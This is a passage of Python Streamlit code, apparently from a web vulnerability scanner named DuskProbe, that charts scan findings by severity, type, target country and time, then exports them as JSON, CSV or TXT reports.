                for f in all_findings:
                    sev = f.get('severity', 'LOW')
                    if sev in severity_counts:
                        severity_counts[sev] += 1
                
                # Create spectrum visualization
                spec_col1, spec_col2, spec_col3, spec_col4 = st.columns(4)
                with spec_col1:
                    st.metric("🔴 Critical", severity_counts['CRITICAL'], 
                             delta="High Priority" if severity_counts['CRITICAL'] > 0 else None)
                with spec_col2:
                    st.metric("🟠 High", severity_counts['HIGH'])
                with spec_col3:
                    st.metric("🟡 Medium", severity_counts['MEDIUM'])
                with spec_col4:
                    st.metric("🟢 Low", severity_counts['LOW'])
                
                # Bar chart spectrum
                import plotly.graph_objects as go
                
                fig = go.Figure(data=[
                    go.Bar(
                        x=['Critical', 'High', 'Medium', 'Low'],
                        y=[severity_counts['CRITICAL'], severity_counts['HIGH'], 
                           severity_counts['MEDIUM'], severity_counts['LOW']],
                        marker_color=['#ff4444', '#ff9800', '#ffeb3b', '#4caf50'],
                        text=[severity_counts['CRITICAL'], severity_counts['HIGH'], 
                              severity_counts['MEDIUM'], severity_counts['LOW']],
                        textposition='auto',
                    )
                ])
                fig.update_layout(
                    title="Severity Distribution Spectrum",
                    xaxis_title="Severity Level",
                    yaxis_title="Number of Findings",
                    height=400,
                    showlegend=False
                )
                st.plotly_chart(fig, use_container_width=True)
            
            with viz_tab2:
                st.markdown("#### Vulnerability Type Radar Chart")
                
                # Get vulnerability types
                vuln_types = {}
                for f in all_findings[:50]:  # Limit to top 50 for readability
                    vtype = f.get('type', 'Unknown')
                    vuln_types[vtype] = vuln_types.get(vtype, 0) + 1
                
                # Take top 8 categories for radar
                top_vulns = dict(sorted(vuln_types.items(), key=lambda x: x[1], reverse=True)[:8])
                
                if len(top_vulns) >= 3:
                    fig = go.Figure(data=go.Scatterpolar(
                        r=list(top_vulns.values()),
                        theta=list(top_vulns.keys()),
                        fill='toself',
                        marker=dict(color='#2196f3'),
                        line=dict(color='#1976d2')
                    ))
                    fig.update_layout(
                        polar=dict(
                            radialaxis=dict(visible=True, range=[0, max(top_vulns.values())])
                        ),
                        title="Top Vulnerability Categories (Radar View)",
                        height=500
                    )
                    st.plotly_chart(fig, use_container_width=True)
                else:
                    st.info("Need at least 3 vulnerability types for radar chart")
            
            with viz_tab3:
                st.markdown("#### Geographic Distribution")
                
                # Extract geographic data from reconnaissance
                geo_data = []
                for result in all_results:
                    if result and 'site_info' in result:
                        site_info = result['site_info']
                        recon = site_info.get('advanced_recon', {})
                        ip_intel = recon.get('ip_intelligence', {})
                        
                        if isinstance(ip_intel, dict):
                            country = ip_intel.get('asn_country', 'Unknown')
                            if country and country != 'Unknown':
                                geo_data.append({
                                    'country': country,
                                    'url': result.get('url', 'Unknown'),
                                    'findings': len(result.get('findings', []))
                                })
                
                if geo_data:
                    # Country code mapping for plotly
                    country_codes = {
                        'US': 'USA', 'GB': 'GBR', 'CA': 'CAN', 'AU': 'AUS', 'DE': 'DEU',
                        'FR': 'FRA', 'IT': 'ITA', 'ES': 'ESP', 'NL': 'NLD', 'JP': 'JPN',
                        'CN': 'CHN', 'IN': 'IND', 'BR': 'BRA', 'RU': 'RUS', 'KR': 'KOR'
                    }
                    
                    # Aggregate by country
                    country_counts = {}
                    for item in geo_data:
                        country = item['country']
                        country_counts[country] = country_counts.get(country, 0) + item['findings']
                    
                    # Convert to full country codes
                    countries_full = [country_codes.get(c, c) for c in country_counts.keys()]
                    
                    fig = go.Figure(data=go.Choropleth(
                        locations=countries_full,
                        z=list(country_counts.values()),
                        text=list(country_counts.keys()),
                        colorscale='Reds',
                        marker_line_color='darkgray',
                        marker_line_width=0.5,
                        colorbar_title="Findings",
                    ))
                    fig.update_layout(
                        title_text='Geographic Distribution of Targets',
                        geo=dict(
                            showframe=False,
                            showcoastlines=True,
                            projection_type='natural earth'
                        ),
                        height=500
                    )
                    st.plotly_chart(fig, use_container_width=True)
                    
                    st.markdown("**Target Countries:**")
                    for country, count in country_counts.items():
                        st.markdown(f"- **{country}**: {count} findings")
                else:
                    st.info("No geographic data available from reconnaissance")
            
            with viz_tab4:
                st.markdown("#### Scan Timeline & Trends")
                
                if len(st.session_state.scan_history) > 1:
                    # Extract timeline data
                    timeline_data = []
                    for scan in st.session_state.scan_history:
                        findings = []
                        for result in scan['results']:
                            if result and 'findings' in result:
                                findings.extend(result['findings'])
                        
                        timeline_data.append({
                            'timestamp': scan['timestamp'],
                            'total': len(findings),
                            'critical': len([f for f in findings if f.get('severity') == 'CRITICAL']),
                            'high': len([f for f in findings if f.get('severity') == 'HIGH']),
                            'medium': len([f for f in findings if f.get('severity') == 'MEDIUM']),
                            'low': len([f for f in findings if f.get('severity') == 'LOW'])
                        })
                    
                    timestamps = [d['timestamp'] for d in timeline_data]
                    
                    fig = go.Figure()
                    fig.add_trace(go.Scatter(x=timestamps, y=[d['critical'] for d in timeline_data],
                                            mode='lines+markers', name='Critical', line=dict(color='#ff4444')))
                    fig.add_trace(go.Scatter(x=timestamps, y=[d['high'] for d in timeline_data],
                                            mode='lines+markers', name='High', line=dict(color='#ff9800')))
                    fig.add_trace(go.Scatter(x=timestamps, y=[d['medium'] for d in timeline_data],
                                            mode='lines+markers', name='Medium', line=dict(color='#ffeb3b')))
                    fig.add_trace(go.Scatter(x=timestamps, y=[d['low'] for d in timeline_data],
                                            mode='lines+markers', name='Low', line=dict(color='#4caf50')))
                    
                    fig.update_layout(
                        title="Scan History Timeline",
                        xaxis_title="Scan Time",
                        yaxis_title="Number of Findings",
                        height=400,
                        hovermode='x unified'
                    )
                    st.plotly_chart(fig, use_container_width=True)
                else:
                    st.info("Complete multiple scans to see timeline trends")
            
            # ========== EXPORT OPTIONS ==========
            st.markdown("---")
            st.markdown("### 📥 Export Reports")
            
            export_col1, export_col2, export_col3 = st.columns(3)
            
            with export_col1:
                # JSON Export
                json_report = json.dumps(results, default=str, indent=2)
                st.download_button(
                    label="📄 Export JSON",
                    data=json_report,
                    file_name=f"duskprobe_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    mime="application/json",
                    use_container_width=True
                )
            
            with export_col2:
                # CSV Export
                if all_findings:
                    findings_data = []
                    for f in all_findings:
                        findings_data.append({
                            'URL': f.get('url', ''),
                            'Type': f.get('type', ''),
                            'Severity': f.get('severity', ''),
                            'Description': f.get('description', ''),
                            'Payload': f.get('payload', '')
                        })
                    df_export = pd.DataFrame(findings_data)
                    csv_data = df_export.to_csv(index=False)
                    st.download_button(
                        label="📊 Export CSV",
                        data=csv_data,
                        file_name=f"duskprobe_findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                        mime="text/csv",
                        use_container_width=True
                    )
            
            with export_col3:
                # TXT Export
                text_report = f"""DUSKPROBE SECURITY SCAN REPORT
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
===============================================

SUMMARY
-------
Total Findings: {len(all_findings)}
Critical: {severity_counts['CRITICAL']}
High: {severity_counts['HIGH']}
Medium: {severity_counts['MEDIUM']}
Low: {severity_counts['LOW']}

DETAILED FINDINGS
-----------------
"""
                for idx, f in enumerate(all_findings, 1):
                    text_report += f"\n{idx}. [{f.get('severity', 'UNKNOWN')}] {f.get('type', 'Unknown')}\n"
                    text_report += f"   URL: {f.get('url', 'N/A')}\n"
                    text_report += f"   Description: {f.get('description', 'N/A')}\n"
                
                st.download_button(
                    label="📝 Export TXT",
                    data=text_report,
                    file_name=f"duskprobe_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                    mime="text/plain",
                    use_container_width=True
                )
        
        else:
            st.info("📭 No scan results available for export. Run a scan first.")
    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        st.warning("⚠️ Application interrupted by user.")
    except Exception as e:
        st.error(f"🔥 An unexpected error occurred: {str(e)}")
        if st.checkbox("Show detailed error"):
            st.exception(e)